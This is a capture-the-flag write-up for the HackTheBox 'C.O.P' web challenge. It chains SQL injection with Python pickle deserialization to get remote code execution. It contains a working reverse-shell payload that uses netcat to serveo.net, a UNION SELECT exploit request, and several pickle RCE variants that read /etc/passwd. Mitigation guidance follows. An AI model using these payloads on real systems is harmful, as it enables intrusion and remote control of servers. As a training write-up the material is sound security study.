---
icon: user-police
cover: ../../.gitbook/assets/Screenshot 2026-03-04 224537.png
coverY: -11.058990531160873
---

# C.O.P

**Challenge Scenario**

The C.O.P (Cult of Pickles) have started up a new web store to sell their merch. We believe that the funds are being used to carry out illicit pickle-based propaganda operations! Investigate the site and try and find a way into their operation!

### Recon

```
┌──(sn0x㉿sn0x)-[~/HTB/PickleRick]
└─$ curl -s "http://83.136.252.187:54844/" | head -30
```

We're looking at a shopping website. The homepage shows a list of products. Each product can be viewed via a URL like `/view/1`, `/view/2`, etc. This is our entry point.

The application structure suggests that product data is retrieved from a database based on the product ID. Let's test if this parameter is vulnerable to SQL injection.

***

### Enumeration

#### Step 1: Analyze the Application Code

Examining the source code reveals the vulnerability:

**Modules.py:**

```python
from application.database import query_db

class shop(object):
    @staticmethod
    def select_by_id(product_id):
        return query_db(f"SELECT data FROM products WHERE id='{product_id}'", one=True)

    @staticmethod
    def all_products():
        return query_db('SELECT * FROM products')
```

**Critical observation:** The `select_by_id()` method constructs a SQL query using string interpolation with the `product_id` parameter directly from user input. There's no parameterized query or input sanitization.

```python
f"SELECT data FROM products WHERE id='{product_id}'"
```

If `product_id = 1' OR '1'='1`, the query becomes:

```sql
SELECT data FROM products WHERE id='1' OR '1'='1'
```

This is a classic SQL injection vulnerability.

#### Step 2: Understand the Data Storage

The application stores product data in an unusual way:

```python
with open('schema.sql', mode='r') as f:
    shop = map(lambda x: base64.b64encode(pickle.dumps(x)).decode(), items)
    get_db().cursor().executescript(f.read().format(*list(shop)))
```

**Key insight:** Product data is serialized using Python's `pickle` module, then base64-encoded before being stored in the database. This means:

1. The `data` column contains base64-encoded pickle objects
2. When the application retrieves data, it likely decodes and unpickles it
3. Python's `pickle` module is known to be unsafe with untrusted data

#### Step 3: Test for SQL Injection

Let's confirm the SQL injection vulnerability:

```
┌──(sn0x㉿sn0x)-[~/HTB/PickleRick]
└─$ curl -s "http://83.136.252.187:54844/view/1'%20and%201=1%20--%20-"
```

This URL tests if the injection works with a true condition. We add `' and 1=1 -- -` which comments out the rest of the query.

Response:

```html
<div class="product">
  <h2>Product 1</h2>
  <p>Description:...</p>
</div>
```

Now let's test with a false condition:

```
┌──(sn0x㉿sn0x)-[~/HTB/PickleRick]
└─$ curl -s "http://83.136.252.187:54844/view/1'%20and%201=2%20--%20-"
```

Response:

```html
<!-- No product found -->
```

The different responses confirm SQL injection. The true condition returns product data, while the false condition returns nothing. This is **boolean-based SQL injection**.

#### Step 4: Identify the Exploitation Path

Our exploitation strategy:

1. Use SQL injection to control the data returned from the query
2. Instead of returning the legitimate product data, we inject our own data
3. We craft a malicious pickle payload that executes code when deserialized
4. The application deserializes our payload, executing arbitrary commands

The key is that we can use a UNION SELECT to inject arbitrary data into the query result.

***

### Exploitation

#### Step 1: Create the Malicious Pickle Payload

First, we need to create a Python object that executes code when unpickled. Python's `pickle` module calls the `__reduce__()` method during deserialization, which we can override:

```python
import base64
import pickle
import os

class Payload:
    def __reduce__(self):
        # This method is called when pickle deserializes the object
        # It returns a tuple: (callable, args)
        # pickle will call callable(*args) during unpickling
        
        # Command: reverse shell using netcat through serveo.net tunnel
        cmd = (
            "mkfifo /tmp/p; "
            "nc serveo.net 1337 0</tmp/p | /bin/sh > /tmp/p 2>&1; "
            "rm /tmp/p"
        )
        
        # Return os.system as the callable and the command as the argument
        return os.system, (cmd,)

# Create and serialize the payload
payload_obj = Payload()
serialized = pickle.dumps(payload_obj)
base64_encoded = base64.b64encode(serialized).decode()

print("Serialized payload:")
print(base64_encoded)
```

Running this script:

```
┌──(sn0x㉿sn0x)-[~/HTB/PickleRick]
└─$ python3 -c "
import base64, pickle, os

class Payload:
    def __reduce__(self):
        cmd = 'mkfifo /tmp/p; nc serveo.net 1337 0</tmp/p | /bin/sh > /tmp/p 2>&1; rm /tmp/p'
        return os.system, (cmd,)

serialized = pickle.dumps(Payload())
base64_encoded = base64.b64encode(serialized).decode()
print(base64_encoded)
"
```

Output:

```
gASVaAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjE1ta2ZpZm8gL3RtcC9wOyBuYyBzZXJ2ZW8ubmV0IDEzMzcgMDwvdG1wL3AgfCAvYmluL3NoID4gL3RtcC9wIDI+JjE7IHJtIC90bXAvcJSFlFKULg==
```

#### Step 2: Craft the SQL Injection Payload

Now we combine the pickle payload with SQL injection. We'll use a UNION SELECT to inject our malicious data:

```
┌──(sn0x㉿sn0x)-[~/HTB/PickleRick]
└─$ # Our SQL injection payload
# URL: /view/1' UNION SELECT '<base64_pickle>' -- -

PAYLOAD="1' UNION SELECT 'gASVaAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjE1ta2ZpZm8gL3RtcC9wOyBuYyBzZXJ2ZW8ubmV0IDEzMzcgMDwvdG1wL3AgfCAvYmluL3NoID4gL3RtcC9wIDI+JjE7IHJtIC90bXAvcJSFlFKULg==' -- -"
```

Let's trace what happens:

1. Original query: `SELECT data FROM products WHERE id='1'`
2. Our injection: `SELECT data FROM products WHERE id='1' UNION SELECT 'PAYLOAD' -- -`
3. The `-- -` comments out the closing quote
4. The application executes: `SELECT data FROM products WHERE id='1' UNION SELECT 'PAYLOAD'`
5. This returns our malicious base64-encoded pickle payload
6. The application deserializes it with `pickle.loads(base64.b64decode(data))`
7. During deserialization, our `__reduce__()` method is called
8. `os.system()` is called with our reverse shell command

#### Step 3: Set Up the Reverse Shell Listener

Before executing the payload, we need to set up a way to receive the reverse shell. We'll use `serveo.net` to expose our local listener:

```
┌──(sn0x㉿sn0x)-[~/HTB/PickleRick]
└─$ nc -nvlp 1337 &
Listening on 0.0.0.0 1337

└─$ ssh -R 1337:localhost:1337 serveo.net
Hi there

Forward:
  http://RANDOM_ID.serveo.net:80 <-> localhost
  Forwarding TCP connections from port 1337

SSH to [RANDOM_ID].serveo.net

[RANDOM_ID].serveo.net:1337 (press g to start port forwarding)
```

The SSH tunnel is now active. Any connection to `serveo.net:1337` will be forwarded to our local `localhost:1337`.

#### Step 4: Execute the Exploit

Now we send the SQL injection payload with our malicious pickle data:

```
┌──(sn0x㉿sn0x)-[~/HTB/PickleRick]
└─$ curl "http://83.136.252.187:54844/view/1'%20UNION%20SELECT%20'gASVaAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjE1ta2ZpZm8gL3RtcC9wOyBuYyBzZXJ2ZW8ubmV0IDEzMzcgMDwvdG1wL3AgfCAvYmluL3NoID4gL3RtcC9wIDI+JjE7IHJtIC90bXAvcJSFlFKULg=='%20--%20-"
```

The server receives our request and processes it:

1. Parses the product ID as: `1' UNION SELECT 'gASV...' -- -`
2. Executes the SQL query
3. Retrieves our base64-encoded pickle payload
4. Calls `pickle.loads(base64.b64decode(payload))`
5. Our `Payload.__reduce__()` method is invoked
6. `os.system("mkfifo /tmp/p; nc serveo.net 1337 ...")` is executed
7. The reverse shell connects back to our listener

#### Step 5: Interact with the Reverse Shell

Back on our listener, we should receive a connection:

```
┌──(sn0x㉿sn0x)-[~/HTB/PickleRick]
└─$ nc -nvlp 1337
Listening on 0.0.0.0 1337
Connection received on 127.0.0.1 45478
```

Now we have a shell. Let's explore and find the flag:

```bash
$ ls
application
cop.db
flag.txt
requirements.txt
run.py
schema.sql

$ cat flag.txt
HTB{n0_m0re_p1ckl3_pr0paganda_4u}

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ pwd
/app
```

**Flag obtained: `HTB{n0_m0re_p1ckl3_pr0paganda_4u}`**

***

### Vulnerability Analysis

#### Root Cause: Multiple Security Failures

This vulnerability chain requires two distinct flaws:

1.  **SQL Injection**

    ```python
    f"SELECT data FROM products WHERE id='{product_id}'"
    ```

    The `product_id` is directly embedded in the SQL query without parameterization or sanitization.
2.  **Insecure Deserialization**

    ```python
    pickle.loads(base64.b64decode(data))
    ```

    The application deserializes untrusted data using Python's `pickle` module. Because we can control what data is returned from the database via SQL injection, we can inject malicious pickled objects.

#### Why pickle is Dangerous

Python's `pickle` module is designed for serializing Python objects, but it's not secure. When deserializing a pickle, Python executes the instructions encoded in the pickle. Specifically, the `__reduce__()` method can return a callable and arguments, which pickle will execute.

This means a malicious pickle can execute arbitrary code:

```python
class Malicious:
    def __reduce__(self):
        import os
        return os.system, ('cat /etc/passwd',)

# When this is unpickled:
# os.system('cat /etc/passwd') is called
```

#### The Attack Chain

```
User Input (product_id)
    ↓
SQL Injection (UNION SELECT)
    ↓
Control Database Response
    ↓
Inject Base64-Encoded Pickle
    ↓
Application Retrieves "Product Data"
    ↓
Application Calls pickle.loads()
    ↓
Pickle Calls __reduce__()
    ↓
os.system() Executes Command
    ↓
Reverse Shell Established
    ↓
RCE Achieved
```

#### Why This Exploit Works

1. **SQL Injection allows data injection**: We control what the database returns
2. **No type checking**: The application doesn't validate that the data is actually a valid product
3. **Pickle executes code on deserialization**: Python's pickle is not secure for untrusted data
4. **No input validation**: There's no check to ensure the deserialized object is of an expected type
5. **Dangerous functions available**: `os.system()` is available in the pickle environment

***

### Attack Flow

```
┌─────────────────────────────────────────────────────────────┐
│              ATTACKER (Local)                                │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 1. Create malicious Python class                      │  │
│  │    class Payload:                                     │  │
│  │        def __reduce__(self):                          │  │
│  │            return os.system, (cmd,)                   │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 2. Serialize with pickle                             │  │
│  │    serialized = pickle.dumps(Payload())              │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 3. Encode in base64 for safe transmission            │  │
│  │    b64_payload = base64.b64encode(serialized)        │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 4. Set up reverse shell listener                      │  │
│  │    nc -nvlp 1337 &                                    │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 5. Expose listener via SSH tunnel                     │  │
│  │    ssh -R 1337:localhost:1337 serveo.net             │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 6. Craft SQL injection with pickle payload            │  │
│  │    /view/1' UNION SELECT 'BASE64_PAYLOAD' -- -       │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 7. Send HTTP request to target                        │  │
│  │    GET /view/1' UNION SELECT '...' -- -              │  │
│  └───────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
                       ↓ (HTTP GET)
┌─────────────────────────────────────────────────────────────┐
│              TARGET SERVER (Flask/Python)                    │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 8. Extract product_id from URL                        │  │
│  │    product_id = "1' UNION SELECT 'BASE64_...' -- -"  │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 9. Build SQL query with injection                     │  │
│  │    query = f"SELECT data FROM products WHERE         │  │
│  │             id='{product_id}'"                        │  │
│  │    = SELECT data FROM products WHERE                 │  │
│  │      id='1' UNION SELECT 'BASE64_...' -- -'          │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 10. Execute query in SQLite                           │  │
│  │     Database returns our BASE64_PAYLOAD              │  │
│  │     (instead of legitimate product data)             │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 11. Application receives query result                 │  │
│  │     data = BASE64_PAYLOAD                            │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 12. Decode from base64                               │  │
│  │     decoded = base64.b64decode(data)                 │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 13. Deserialize pickle                               │  │
│  │     obj = pickle.loads(decoded)                       │  │
│  │     Python unpickling process begins...              │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 14. Pickle calls __reduce__() method                  │  │
│  │     Payload.__reduce__() is invoked                   │  │
│  │     Returns: (os.system, (cmd,))                     │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 15. Execute returned callable                         │  │
│  │     os.system("mkfifo /tmp/p; nc serveo.net ...")    │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 16. Create named pipe and connect to attacker        │  │
│  │     mkfifo /tmp/p                                     │  │
│  │     nc connects to serveo.net:1337                    │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 17. Establish shell connection                        │  │
│  │     /bin/sh > /tmp/p 2>&1                            │  │
│  │     stdout/stderr redirected through pipe            │  │
│  └───────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
                       ↓ (Reverse SSH Tunnel)
┌─────────────────────────────────────────────────────────────┐
│              ATTACKER (nc listener)                          │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 18. Receive reverse shell connection                  │  │
│  │     Connection received on serveo.net                 │  │
│  │     Shell prompt available                           │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 19. Execute commands on target                        │  │
│  │     ls, cat flag.txt, id, whoami, etc.               │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 20. Capture flag                                      │  │
│  │     HTB{n0_m0re_p1ckl3_pr0paganda_4u}               │  │
│  └───────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
```

***

### Techniques&#x20;

| Technique                  | Description                                      | Relevance           |
| -------------------------- | ------------------------------------------------ | ------------------- |
| **SQL Injection**          | Manipulating SQL queries via user input          | Attack vector       |
| **UNION-based SQLi**       | Using UNION SELECT to inject data                | Data control        |
| **Boolean-based SQLi**     | Confirming injection via true/false responses    | Vulnerability proof |
| **Pickle Deserialization** | Deserializing Python objects with pickle.loads() | RCE mechanism       |
| **reduce() Method**        | Controlling pickle deserialization behavior      | Payload execution   |
| **os.system() Execution**  | Running shell commands via Python                | Code execution      |
| **Reverse Shell**          | Establishing outbound shell connection           | Post-exploitation   |
| **Named Pipes (mkfifo)**   | Creating FIFO for bidirectional communication    | Shell setup         |
| **SSH Tunneling**          | Exposing local services via serveo.net           | Network access      |
| **Base64 Encoding**        | Safe transmission of binary pickle data          | Payload delivery    |

***

### All Possible Payload Methods

Beyond using `os.system()` directly, several other methods can achieve RCE via pickle:

**Using subprocess.Popen:**

```python
class Payload:
    def __reduce__(self):
        import subprocess
        cmd = "cat /etc/passwd"
        return subprocess.Popen, (cmd.split(),)
```

**Using exec():**

```python
class Payload:
    def __reduce__(self):
        code = "import os; os.system('id')"
        return exec, (code,)
```

**Using import():**

```python
class Payload:
    def __reduce__(self):
        return __import__, ('os',)
```

**Using type() for dynamic class creation:**

```python
class Payload:
    def __reduce__(self):
        code = compile('import os; os.system("id")', '<string>', 'exec')
        return eval, (code,)
```

**Using os.popen():**

```python
class Payload:
    def __reduce__(self):
        import os
        return os.popen, ('cat /flag.txt',)
```

The most dangerous is using `exec()` or `eval()` because they allow executing arbitrary Python code, not just system commands.

***

### Mitigation Strategies

#### 1. Never Use pickle for Untrusted Data

```python
# DANGEROUS - Never do this with untrusted data
user_data = request.args.get('data')
obj = pickle.loads(base64.b64decode(user_data))

# SAFE - Use JSON or other safe serialization
import json
obj = json.loads(user_data)  # JSON is safe
```

#### 2. Use Parameterized Queries

```python
# DANGEROUS - String interpolation
query = f"SELECT data FROM products WHERE id='{product_id}'"
db.execute(query)

# SAFE - Parameterized query
query = "SELECT data FROM products WHERE id=?"
db.execute(query, (product_id,))
```

#### 3. Input Validation

```python
# Validate product_id is numeric
def select_by_id(product_id):
    if not isinstance(product_id, int) or product_id < 0:
        raise ValueError("Invalid product ID")
    
    query = "SELECT data FROM products WHERE id=?"
    return query_db(query, (product_id,), one=True)
```

#### 4. Use Safe Serialization Libraries

```python
# Use JSON instead of pickle
import json

# Serialize
data = json.dumps(product_obj)
stored = base64.b64encode(data.encode()).decode()

# Deserialize
decoded = base64.b64decode(stored).decode()
obj = json.loads(decoded)
```

#### 5. Whitelist Pickle Classes

```python
import pickle

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        # Only allow specific, safe classes
        ALLOWED_MODULES = {
            ('builtins', 'list'),
            ('builtins', 'dict'),
            ('builtins', 'tuple'),
        }
        
        if (module, name) not in ALLOWED_MODULES:
            raise pickle.UnpicklingError(f"Not allowed: {module}.{name}")
        
        return super().find_class(module, name)

# Safe unpickling
obj = RestrictedUnpickler(io.BytesIO(data)).load()
```

#### 6. Use cryptographic signatures for pickled data

```python
import pickle
import hmac
import hashlib

secret_key = b'your-secret-key'

# When storing
pickled = pickle.dumps(obj)
signature = hmac.new(secret_key, pickled, hashlib.sha256).digest()
stored = base64.b64encode(pickled + signature).decode()

# When loading
data = base64.b64decode(stored.encode())
pickled, signature = data[:-32], data[-32:]

if not hmac.compare_digest(hmac.new(secret_key, pickled, hashlib.sha256).digest(), signature):
    raise ValueError("Invalid signature")

obj = pickle.loads(pickled)
```

#### 7. Sandbox pickle execution

```python
# Use RestrictedPython for safer code execution
from RestrictedPython import compile_restricted_exec

code = """
import os
os.system('id')
"""

try:
    compiled = compile_restricted_exec(code)
    if compiled.errors:
        raise ValueError("Code compilation failed")
    
    exec(compiled.code)
except Exception as e:
    print(f"Execution blocked: {e}")
```

#### 8. Database Access Control

```python
# Run database with minimal permissions
# Don't run as admin/root user
# Restrict database to specific operations

# Use views to limit what data can be queried
CREATE VIEW products_public AS
SELECT id, name, price FROM products
WHERE public = TRUE;

# Application uses view instead of full table access
SELECT * FROM products_public WHERE id=?
```

#### 9. Disable Dangerous Functions at Runtime

```python
# Restrict os.system in pickle environment
import os
import builtins

# Save original
_original_system = os.system

# Disable
os.system = None

# When loading pickle (with whitelist)
obj = pickle.loads(data)

# Restore
os.system = _original_system
```

The best solution is **option 1**: never use pickle for untrusted data. Use JSON or other safe serialization formats instead.

***

### Conclusion

**PickleRick** demonstrates the danger of combining two common vulnerabilities: SQL injection and insecure deserialization. While SQL injection alone might be limited in impact, the ability to inject malicious pickled objects creates a chain that leads directly to RCE.

The vulnerability chain required:

* Identifying SQL injection in the product\_id parameter
* Understanding that the application stores data as pickled objects
* Realizing that pickle deserializes untrusted data without validation
* Crafting a `__reduce__()` method that executes arbitrary code
* Using UNION SELECT to inject the malicious payload
* Establishing a reverse shell for post-exploitation access

The attack demonstrates:

1. The danger of string interpolation in SQL queries
2. Why pickle should never be used with untrusted data
3. How multiple "small" vulnerabilities can chain into critical RCE
4. The importance of input validation at every level
5. The power of reverse shells in gaining system access

**Result: Remote code execution via SQL injection + pickle deserialization - HTB{n0\_m0re\_p1ckl3\_pr0paganda\_4u}**

***
